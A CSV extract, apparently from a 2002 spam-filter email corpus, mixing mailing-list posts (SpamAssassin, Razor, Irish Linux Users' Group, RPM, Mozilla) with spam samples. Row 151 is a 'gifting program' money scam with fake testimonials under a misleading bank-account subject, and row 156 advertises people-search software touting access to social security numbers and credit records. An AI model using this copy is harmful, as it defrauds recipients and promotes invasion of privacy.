id,subject,email
149,"Subject: [use Perl] Headlines for 2002-08-24
","use Perl Daily Headline Mailer
 
 Damian Conway Publishes Exegesis 5
     posted by hfb on Friday August 23, @14:06 (perl6)
     http://use.perl.org/article.pl?sid=02/08/23/187226
 
 2nd Open Source CMS Conference
     posted by ziggy on Friday August 23, @18:30 (events)
     http://use.perl.org/article.pl?sid=02/08/23/1837242
 
 
 
 
 Copyright 1997-2002 pudge.  All rights reserved.
 
 
 ======================================================================
 
 You have received this message because you subscribed to it
 on use Perl.  To stop receiving this and other
 messages from use Perl, or to add more messages
 or change your preferences, please go to your user page.
 
 	http://use.perl.org/my/messages/
 
 You can log in and change your preferences from there.
 
"
150,"Subject: Re: [SAtalk] redhat init.d script for spamd and the -H option
","
 --UHN/qo2QbUvPLonB
 Content-Type: text/plain; charset=us-ascii
 Content-Disposition: inline
 Content-Transfer-Encoding: quoted-printable
 
 On Fri, Sep 06, 2002 at 11:32:01AM -0500, Josh Hildebrand wrote:
 > Unfortunately, when I run that, it complains about the H parameter.
 >=20
 >   -F 0|1          remove/add 'From ' line at start of output (default: 1)
 >=20
 > But I can run it on the command line as ""spamd -d -c -a -H"" just fine.
 >=20
 > Anyone else run into this problem?
 
 you look to have 2 versions of spamd installed.  The one running from
 the RC script is pre-2.4 (there is a -H now, and -F has been removed),
 but the one you run from the commandline seems to be a 2.4x version.
 
 I would find that old version of SA and blow it away.
 
 --=20
 Randomly Generated Tagline:
 ""If you lend someone $20, and never see that person again, it was probably
  worth it."" - Zen Musings
 
 --UHN/qo2QbUvPLonB
 Content-Type: application/pgp-signature
 Content-Disposition: inline
 
 -----BEGIN PGP SIGNATURE-----
 Version: GnuPG v1.0.6 (GNU/Linux)
 Comment: For info see http://www.gnupg.org
 
 iD8DBQE9eOvDAuOQUeWAs2MRAmQQAKDvRrfV2FasxShCaSQCCdfbvx4mbQCeK3Eq
 IXNsRLjK0elfi5oPbnQedEI=
 =woQJ
 -----END PGP SIGNATURE-----
 
 --UHN/qo2QbUvPLonB--
 
 
 -------------------------------------------------------
 This sf.net email is sponsored by: OSDN - Tired of that same old
 cell phone?  Get a new here for FREE!
 https://www.inphonic.com/r.asp?r=sourceforge1&refcode1=vs3390
 _______________________________________________
 Spamassassin-talk mailing list
 Spamassassin-talk@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/spamassassin-talk
 
 
"
151,"Subject: RE: Important Information Concerning Your Bank Account 
","TIRED OF THE BULL OUT THERE?
 Want To Stop Losing Money?
 
 WANT A REAL MONEY MAKER?
 RECEIVE $1,000-$5,000 TODAY!
 EXPERTS ARE CALLING THIS THE FASTEST WAY TO HUGE CASH FLOW EVER CONCEIVED!
 
 A POWERHOUSE Gifting Program You Don't Want To Miss!
 We work as a TEAM! 
 
 This is YOUR Private Invitation GET IN WITH THE FOUNDERS! This is where the BIG BOYS PLAY! The MAJOR PLAYERS are on This ONE For ONCE be where the Players are
 
 This is a system that will drive $1,000's to your doorstep 
 In a short period of time!
 
 Leverage $1000.00 into $50,000, Over and Over Again 
 
 THE QUESTION HERE IS:
 
 YOU EITHER WANT TO BE WEALTHY OR YOU DON'T!!!
 
 WHICH ONE ARE YOU?
 
 I am tossing you a financial lifeline and for your sake I 
 
 Hope you GRAB onto it and hold on tight For the Ride of your life!
 
 Testimonials
 
 Hear what average people are doing their first few days:
 We've received 8,000 in 1 day and we are doing that over and over again!' Q.S. in AL
  I'm a single mother in FL and I've received 12,000 in the last 4 days. D. S. in FL
 I was not sure about this when I sent off my $1,000 pledge, but I got back $2,000 the very next day! L.L. in KY
 I didn't have the money, so I found myself a partner to work this with. We have received $4,000 over the last 2 days. I think I made the right decision; don't you? K. C. in FL
 I pick up $3,000 my first day and I they gave me free leads and all the training, you can too! J.W. in CA
 
 This WILL be the Most IMPORTANT Call you make this Year!
 
 
 FREE LEADS!!!!!!! TRAINING!!!!!!!
 
 ANNOUNCING: We will CLOSE your sales for YOU! And Help you get a Fax Blast IMMEDIATELY Upon Your Entry!!!    YOU Make the MONEY!!!
 FREE LEADS!!!!!!! TRAINING!!!!!!!
 
 $$DON'T WAIT!!! CALL NOW $$ 1-800-896-6568
 Print and Fax to 1-800-421-6318 or send an email 
 requesting more information to successleads@firemail.de
 Please include your name and telephone number. 
 
 *Receive 10,000 FREE LEADS just for responding! (a $499.99 value)
 
 Name___________________________________
 Phone___________________________________
 Fax_____________________________________
 Email___________________________________ 
 
 
 This message is sent in compliance of the new e-mail bill. ""Per Section 301, Paragraph (a)(2)(C) of S. 1618, further transmissions by the sender of this email may be stopped, at no cost to you, by sending a reply to this email address with the word ""REMOVE"" in the subject line. Errors, omissions, and exceptions excluded. 
 This is NOT spam! I have compiled this list from our Replicate Database, relative to Seattle Marketing Group, The Gigt, or Turbo Team for the sole purpose of these communications. Your continued inclusion is ONLY by your gracious permission. If you wish to not receive this mail from me, please send an email to  tesrewinter@yahoo.com with ""Remove"" in the subject and you will be deleted immediately.
 
 
 
 
 
 
 
 
"
152,"Subject: Re: [ILUG] Backup solutions
","Use Amanda at http://www.amanda.org/
 
 Donncha.
 
 On Friday 16 August 2002 15:09, Ciaran Johnston wrote:
 > Hi folks,
 > I maintain a colocated server on behalf of a small group of individuals,
 > and am looking at backup solutions. Is it possible to get some sort of low-
 > end internal tape / other solution that could be used to back up approx. 40
 > Gigs of data or am I just dreaming? My ISP does offer backups at extra cost
 > but the only problem with that is, well, the extra cost.
 >
 > What I was hoping to do was to install some kind of internal tape device,
 > then swap tapes round every month, so I had an onsite backup of say the
 > last 24 hours and an offsite backup of the last month. Is this feasible?
 > I'm beginning to think it isn't. External devices are not an option as part
 > of the charge for colocation is rackspace.
 >
 > Thanks,
 > Ciaran.
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
"
153,"Subject: Entrepreneurs
","An apparent quote from Dubya, from the Times (sent to me by my Dad):
 
 http://www.timesonline.co.uk/printFriendly/0,,1-43-351083,00.html
 
 ------------------------------------------------------------------------------
 TONY BLAIR's special relationship with George W. Bush is under
 considerable strain. Not only do the two disagree on Yassir Arafat's
 tenure as leader of the Palestinian Authority, but Blair has started
 telling disparaging anecdotes about the President.
 
 Baroness Williams of Crosby recalled a story told to her by 'my good
 friend Tony Blair' recently in Brighton. Blair, Bush and Jacques
 Chirac were discussing economics and, in particular, the decline of
 the French economy. 'The problem with the French,' Bush confided in
 Blair, 'is that they don't have a word for entrepreneur.'
 ------------------------------------------------------------------------------
 
 R
 http://xent.com/mailman/listinfo/fork
 
"
154,"Subject: Re: A moment of silence for the First Amendment (fwd)
","Gregory Alan Bolcer wrote:
 
 >at zones to most expediently keep order.  
 >
 >The problem is that politics have gotten so muddied
 >nowadays, that shouting down and unpeaceably disrupting
 >political rallies that you don't agree with has become
 >common practice.  The courts have constantly ruled
 >that there are some restrictions on the first amendment.
 >They teach you that your very first year of law school.
 >  
 >
 What a load of crap. Politics are somehow more muddy now?  I'd say that 
 its considerably
 clearer - the vast majority of people feel disenfranchised, and the 
 common practice of
 putting protestors in boxes is done usually to hide them from TV 
 cameras, visiting dignitaries,
 etc, further exacerbating those feelings.
 ""Unpeaceably disrupting political rallies"" is now usually done by police 
 with riot gear and pepper spray.
 
 We had a good one here a month or so ago - a few people peaceably 
 strayed from the permit area,
 which was nearly a mile from the site of the meeting of finance 
 ministers held here (the motorcade drove
 by it for about 10 seconds), and were immediately gassed,  beaten and 
 arrested. Not very muddied at all.
 
 Owen
 
 
 
 
 
 
 
 
 
 
"
155,"Subject: Re: Problem with an rpm...
","Mark Derricutt wrote:
 > Never mind, there was some cron thing doing rpm -qf ???  seems fine now.
 > 
 > --On Wednesday, February 06, 2002 07:37:44 +1300 Mark Derricutt 
 > <mark@talios.com> wrote:
 > 
 >> Fetched 88.1kB in 2m31s (581B/s)
 >> error: cannot get exclusive lock on /var/lib/rpm/Packages
 >> error: cannot open Packages index using db3 - Operation not permitted (1)
 >> E: could not open RPM database:cannot open Packages index using db3 -
 >> Operation not permitted (1)
 
 You can do a rpm --rebuilddb too
 
 
 _______________________________________________
 RPM-List mailing list <RPM-List@freshrpms.net>
 http://lists.freshrpms.net/mailman/listinfo/rpm-list
 
"
156,"Subject: be your own private eye online
","<!-- saved from url=3D(0022)http://internet.e-mail -->
 <HTML><HEAD><META HTTP-EQUIV=3D""Content-Type"" CONTENT=3D""text/html;charset=
 =3Diso-8859-1"">
 <!DOCTYPE HTML PUBLIC ""-//W3C//DTD HTML 4.0 Transitional//EN"">
 
 <META http-equiv=3DContent-Type content=3D""text/html; charset=3Diso-8859-1=
 "">
 <META content=3D""MSHTML 5.50.4207.2601"" name=3DGENERATOR>
 </HEAD>
 <BODY link=3D""#0000FF"" vlink=3D""#0000FF"" alink=3D""#0000FF"" bgColor=3D#FFFF=
 FF>
 <DIV>
   <table width=3D""601"" border=3D""4"" cellspacing=3D""1"" cellpadding=3D""2"" al=
 ign=3D""center"" bgcolor=3D""#FFFFFF"" height=3D""564"">
     <tr>
       <td>
 <div><br>
           <table width=3D""500"" border=3D2 align=3D""center"" bgcolor=3D""#000=
 099"">
             <tbody>
             <tr bgcolor=3D#000099>
               <td height=3D48>
                 <div align=3Dcenter><font face=3DArial size=3D5><font colo=
 r=3D""#000000"" face=3D""Verdana, Arial, Helvetica, sans-serif"" size=3D""6""><b=
 ><font color=3D""#E8E8E8"">Internet
                   Investigator</font></b><font color=3D""#E8E8E8"">&#153;</f=
 ont></font>
                   </font></div>
               </td>
             </tr>
             </tbody>
           </table>
           <p align=3Dcenter><font face=3D""Arial, Helvetica, sans-serif"" co=
 lor=3D""#000000"" size=3D""6""><b> 
             <font color=3D""#0000CC"">- New</font> <font color=3D""#0000CC"">f=
 or</font> 
             <font color=3D""#0000CC"">2002 -<br>
             </font></b></font><font face=3D""Arial, Helvetica, sans-serif"" =
 size=3D""5""><b><font size=3D""4"" color=3D""#333333"">Internet 
             Software for Online Investigations</font></b></font></p>
           <table width=3D""500"" border=3D""0"" cellspacing=3D""0"" cellpadding=3D=
 ""0"" align=3D""center"">
             <tr>
               <td>
                 <div align=3D""center""><font face=3D""Arial, Helvetica, sans=
 -serif"" color=3D""#FF0000""><b><font size=3D""5"">Find
                   Out <b>Anything</b> about Anyone</font></b><font size=3D=
 ""5""><b>
                   Online</b></font></font></div>
               </td>
             </tr>
           </table>
           <br>
           <table width=3D""500"" border=3D""0"" cellspacing=3D""0"" cellpadding=3D=
 ""0"" align=3D""center"">
             <tr>
               <td>
                 <div align=3D""center""><font face=3D""Arial, Helvetica, sans=
 -serif""><b><font size=3D""3""><u><font color=3D""#0000cc""><a href=3D""http://i=
 spy.stuffing4dollars.com/index.html?RepID=3DRS"">Uncover 
                   Information about</a></font></u><a href=3D""http://ii.cyb=
 old.net/index.html?RepID=3DBH""><font color=3D""#0000cc"">:</font></a></font>=
 </b><font color=3D""#000099"" size=3D""3""><b> 
                   <font face=3D""Arial, Helvetica, sans-serif""><font color=3D=
 ""#000099"" size=3D""3""><b><font color=3D""#999999""><font color=3D""#666666"">en=
 emies,</font></font></b></font></font><font color=3D""#666666""> 
                   </font><font face=3D""Arial, Helvetica, sans-serif"" color=
 =3D""#666666""><font size=3D""3""><b>debtors,</b></font></font><font color=3D""=
 #666666""> 
                   neighbors, friends, employees, co-workers, your boss, yo=
 urself, 
                   associates, former school or military buddies, even a ne=
 w love 
                   interest.</font></b></font></font></div>
               </td>
             </tr>
           </table>
           <br>
           <table width=3D""500"" border=3D""0"" cellspacing=3D""0"" cellpadding=3D=
 ""0"" align=3D""center"">
             <tr>
               <td height=3D""45"">
                 <div align=3D""left""></div>
                 <p align=3Dcenter><font face=3D""Arial, Helvetica, sans-ser=
 if"" color=3D""#666666"" size=3D""5""><b><font size=3D""4"">Become 
                   an Internet Investigator and explore an exciting new wor=
 ld of 
                   valuable information.</font></b></font></p>
               </td>
             </tr>
           </table>
           <div align=3D""left""><font face=3D""Arial, Helvetica, sans-serif"" =
 color=3Dblack
 size=3D5><b><font size=3D4><br>
             </font></b></font><font face=3D""Arial, Helvetica, sans-serif"" =
 color=3Dblack><b></b></font></div>
           <div align=3D""center""><font face=3D""Arial, Helvetica, sans-serif=
 "" color=3D""#0000CC""><b><span style=3D""font-size:12.0pt;font-family:Arial;
 Times New Roman&quot;;color:#0000cc;""><font size=3D""4"">With Internet Inves=
 tigator&#153; 
             </font></span><font face=3D""Arial"" size=3D""4"">you can investig=
 ate:</font></b></font> 
           </div>
           <table width=3D""500"" border=3D""0"" cellspacing=3D""0"" cellpadding=3D=
 ""0"" align=3D""center"">
             <tr>
               <td>
                 <div align=3D""center""><font face=3D""Arial, Helvetica, sans=
 -serif"" color=3Dblack><b><font face=3D""Arial"" size=3D""3""><font color=3D""#6=
 66666"">People, 
                   </font></font></b><font face=3D""Arial"" size=3D""3"" color=3D=
 ""#666666""><b>credit 
                   records, social security numbers, employment records, sc=
 hool 
                   records, criminal records, driving records, addresses, p=
 hone 
                   numbers (even some unlisted), hidden assets, family tree=
 s</b></font> 
                   <font size=3D""3"" color=3D""#666666""><b><font face=3D""Aria=
 l""><span style=3D"" color=3D""#330066"">and 
                   a whole lot more!</span></font></b></font></font></div>
               </td>
             </tr>
           </table>
           <a href=3D""http://ispy.stuffing4dollars/index.html?RepID=3DBH""><=
 br>
           </a></div>
         <div> 
           <p align=3Dcenter><a href=3D""http://ispy.stuffing4dollars.com/in=
 dex.html?RepID=3DRS""><font face=3D""Arial, Helvetica, sans-serif""><b><font =
 size=3D4>Click 
             Here for more Information</font></b></font></a><br>
             <br>
           </p>
         </div>
   </td>
     </tr>
   </table>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center""><font size=3D""2"" face=3D""Verdana, Arial, Helvetica, =
 sans-serif""><a href=3D""#listlink""><br>
     <font size=3D""1"">Unsubscribe Instructions</font></a></font></p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center"">&nbsp;</p>
   <p align=3D""center""><font size=3D""2"" face=3D""Verdana, Arial, Helvetica, =
 sans-serif""><a name=3D""listlink""></a></font></p>
   <table width=3D""597"" border=3D""0"" cellspacing=3D""0"" cellpadding=3D""0"" he=
 ight=3D""346"" align=3D""center"">
     <tr>
       <td height=3D""372"" valign=3D""top"">
         <div align=3D""left""><span style=3D'font-size:7.5pt;mso-bidi-font-s=
 ize:12.0pt;
 font-family:Verdana;color:black'><font color=3D""#999999"">This message is a=
  commercial 
           advertisement. It is in full compliance with all federal and sta=
 te laws 
           regarding email advertising, including the California Business a=
 nd Professions 
           Code. We have provided &quot;opt out&quot; email contact so you =
 can 
           request to be taken off our mailing list. In addition we have pl=
 aced 
           &quot;Adv:&quot; in the subject line to provide you with notific=
 ation 
           in advance that this is a commercial advertisement. We do not wi=
 sh to 
           send our advertising to anyone who does not wish to receive it. =
 </font></span><font color=3D""#999999""><span style=3D'font-size:7.5pt;
 font-family:Verdana'>If you would rather not receive any further informati=
 on from 
           us, please <a href=3D""http://217.13.241.197/remove/?camp=3D1635-=
 001r"">CLICK</a> 
           to be taken off our list. In this way you can &quot;opt-out&quot=
 ; from 
           the list your email address was obtained from, whether it was &q=
 uot;opt-in&quot; 
           or otherwise. Please allow 5-10 business days for your email add=
 ress 
           to be&nbsp;processed and taken off&nbsp;all lists in our control=
 . Meanwhile, 
           delete any duplicate emails that you may receive and rest assure=
 d that 
           your request will be honored. If you have previously requested t=
 o be 
           taken off this list and are still receiving this advertisement, =
 </span><span style=3D'font-size:7.5pt;font-family:Verdana'> 
           you may call us at 1-(888) 817-9902, or write to: Abuse Control =
 Center, 
           7657 Winnetka Ave., Suite 245, Canoga Park, CA 91306</span></fon=
 t></div>
       </td>
     </tr>
   </table>
   <p>&nbsp;</p>
   <p>&nbsp;</p>
 
 </DIV>
 <DIV></DIV>
   </BODY></HTML>
 
 
 
"
157,"Subject: Canadians are knockin' boots less, or just not getting any
","URL: http://www.newsisfree.com/click/-5,8304313,1717/
 Date: 2002-09-27T08:51:29+01:00
 
 [IMG: http://www.newsisfree.com/Images/fark/cbc.ca.gif ([CBC])]
 
 
"
158,"Subject: Re: [Razor-users] What's wrong with the Razor servers now?
","I'm talking specifically about the last ~24 hours where it seems 
 like things have not been working.  People who've been using the 
 Outlook plugin have been telling me they've been seeing really 
 bad performance, which I've been attributing to the problems 
 which have been discussed here and on sa-talk.  I'm not saying 
 it's completely not working, or that it has no chance of being 
 fixed 15 minutes from now, just that it's not currently working, 
 and there have been a number of ""hiccup"" periods in the last 
 couple months.  Plus, it's hard to deny that we don't know yet 
 if the trust network is going to work or not -- it only just got 
 switched on, and that changeover seems to have corresponded with 
 people noticing things have stopped working right.
 
 C
 
 On Thursday, August 8, 2002, at 01:44  PM, Jordan Ritter wrote:
 
 > On Thu, Aug 08, 2002 at 01:36:15PM -0700, Craig R.Hughes wrote:
 >
 > # Razor2 seems to have been a long time in coming, [...] and doesn't
 > # currently work.
 >
 > Quite a strong statement, Craig, one which over 30,000 active users a
 > day would strongly disagree with.
 >
 >
 > --jordan
 >
 
 
 
 -------------------------------------------------------
 This sf.net email is sponsored by:ThinkGeek
 Welcome to geek heaven.
 http://thinkgeek.com/sf
 _______________________________________________
 Razor-users mailing list
 Razor-users@lists.sourceforge.net
 https://lists.sourceforge.net/lists/listinfo/razor-users
 
 
"
159,"Subject: The Office: too painful to watch?
","URL: http://www.newsisfree.com/click/-2,8428489,215/
 Date: 2002-10-01T11:41:00+01:00
 
 *Talk:* Join the discussion on the web's liveliest talkboards.
 
 
"
160,"Subject: Priceless
","URL: http://www.mozillazine.org/weblogs/hyatt/#85443744
 Date: Not supplied
 
 I just finished reading an article about Mozilla[1] for Salon.com[2]. This 
 excerpt was rather amusing.
 
 _It is a good question, because in almost every way, Mozilla is a better 
 browser than Navigator. For example, Netscape's best new feature, tabbed 
 browsing -- which lets you have several Web pages open in the same browser 
 window, and allows you to bookmark all the pages under one name -- was in 
 Mozilla many months ago, and the Mozilla project that created it (called 
 MultiZilla) already has an improved version available. When asked about this, 
 Yecies, of Netscape, said, ""That's true, but the engineer who's working on it 
 [for Mozilla] is a Netscape employee. It was always done with the intention of 
 fostering general browsing usability for Netscape."" 
 _
 Yes, ok, I suppose that's true if by ""Netscape employee"" you really meant 
 ""Apple employee."" and by ""always done with the intention of fostering general 
 browsing usability for Netscape"" you meant ""was done in a weekend for Mozilla 
 because I thought MultiZilla was cool."" 
 
 Here's how the whole tabbed browsing thing happened. One night I finally 
 downloaded an extension called MultiZilla (go check it out on mozdev.org[3]. I 
 was particularly impressed with a feature contained in MultiZilla called tabbed 
 browsing. I started doing research and discovered NetCaptor[4], a tabbed 
 browser that embedded WinIE. 
 
 MultiZilla was cool but at the time suffered from two fundamental flaws that 
 prevented the code from being incorporated into the Mozilla tree. The first was 
 a UI flaw, namely that at the time it had ripped off NetCaptor down to the last 
 context menu item. The GUI was similar enough that there would have been 
 definite concerns about so obviously copying some of NetCaptor's more obscure 
 capabilities (like sticky names and tab locking). The second concern was that 
 the tab behavior wasn't encapsulated cleanly into a widget. 
 
 I produced a simplified version of tabbed browsing on my own time (did it in a 
 weekend) that removed some of the geekier NetCaptor features and that 
 encapsulated the tab behavior so that the changes to other Navigator files 
 would be minimal. Once I established that it didn't degrade performance in the 
 single tab case, I checked it in as an experiment.
 
 The response was overwhelming, as were the bugs that started being filed. So 
 much so that at first I wanted to back tabbed browsing out of the tree. I was 
 overruled by Mozilla, which turned out to be a good thing for all I think. :) 
 Even with all the excitement and hoopla surrounding the advent of tabbed 
 browsing on the engineering side (and in the Mozilla community), Netscape still 
 didn't get it. Netscape marketing prioritized all sorts of useless work that 
 nobody had even started above tabbed browsing in their marketing document. They 
 continued to do so for months, simply not getting it. It was this odd curiosity 
 that one of their engineers had checked in, and they didn't know what to make 
 of it.
 
 Only after the press raved about it did Netscape really jump on board. I'm sure 
 Netscape is doing the same thing now with popup blocking. Can't you just see it 
 now? We'll have a Popup Manager, and a Manager to manage the Popup Manager, and 
 twenty-seven preferences for fine-grained control of all aspects of popups. 
 
 Can you believe how disfunctional Netscape is? When their engineers say ""you 
 should do this"" or ""you should do that"", they get completely ignored (or blown 
 off), but when CNet says ""We didn't like this, or we didn't like that."", 
 Netscape scurries to meet their demands. That is simply pathetic.
 
 [1] http://archive.salon.com/tech/feature/2002/09/10/browser_wars/
 [2] http://www.salon.com
 [3] http://www.mozdev.org
 [4] http://www.netcaptor.com
 
 
"
161,"Subject: Do you have a handlebar moustache? Then the Handlebar Club is the
","URL: http://www.newsisfree.com/click/-3,8256508,1717/
 Date: 2002-09-25T23:11:06+01:00
 
 (Some Gentleman)
 
 
"
162,"Subject: Re: [ILUG] [OT] GPL & PHP Question
","On Sat, Jul 20, 2002 at 07:03:17PM +0100, kevin lyda wrote:
 
 > > > I know this is not strictly a 'Linux' issue but any help would be appreciated
 > > Microsoft has very much made this a Linux issue - it has attempted to imply
 > > that any company using GPL software must make everything it owns public and
 > > it must be true - that nice man from Microsoft wouldn't lie, would he ?
 > 
 > but that's just stupid.  microsoft s/w covers a subset of applications
 
 You know it's stupid - I know it's stupid. Nonetheless, Microsoft has tried
 to spread FUD about the viral nature of the GPL to make CEO/CIO level people
 (often not the most technically clueful, even the CIOs) fear that if they so
 much as use a Linux box, as, say, a print server, they'll have to make their
 company's entire IP public. (I don't think Microsoft said precisely what I
 jsut said, but that was the tenor of the remarks). And their marketing
 budget is a tad bigger than yours or mine.
 
 
 
 Niall
 
 -- 
 Irish Linux Users' Group: ilug@linux.ie
 http://www.linux.ie/mailman/listinfo/ilug for (un)subscription information.
 List maintainer: listmaster@linux.ie
 
 
"
163,"Subject: Re: [zzzzteana] FWD [fort] Evidence Britons Were In The US In The6th Century
","
 
 > > Barbara Blithered;
 > > Others indicators this was a late invention are the use of the f rune
 > > not only for ""f"", but inverted to mean ""ff"" (the welsh ""v"" phoneme) -
 
 > Stew Stired; 
 > Isn't it the other way round, f(welsh)=v(english) ff(welsh)=f(english).
 
 Barbara Babbles;
 Mea culpa. That's what I get for reading my welsh dictionary upside
 down; ""F""n trouble ;-).
 Barbara
 
 ------------------------ Yahoo! Groups Sponsor ---------------------~-->
 4 DVDs Free +s&p Join Now
 http://us.click.yahoo.com/pt6YBB/NXiEAA/MVfIAA/7gSolB/TM
 ---------------------------------------------------------------------~->
 
 To unsubscribe from this group, send an email to:
 forteana-unsubscribe@egroups.com
 
  
 
 Your use of Yahoo! Groups is subject to http://docs.yahoo.com/info/terms/ 
 
 
 
"
